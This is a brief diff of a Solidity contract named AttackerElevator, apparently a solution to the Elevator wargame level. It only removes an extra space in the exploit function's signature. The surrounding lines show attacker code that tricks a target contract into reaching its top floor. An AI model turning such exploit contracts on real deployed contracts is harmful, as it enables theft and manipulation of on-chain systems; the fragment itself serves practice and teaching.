@@ -12,7 +12,7 @@ contract AttackerElevator {
         topFloor = floor;
     }
 
-    function exploit(address elevator) public  {
+    function exploit(address elevator) public {
         Elevator(elevator).goTo(3);
     }
 }
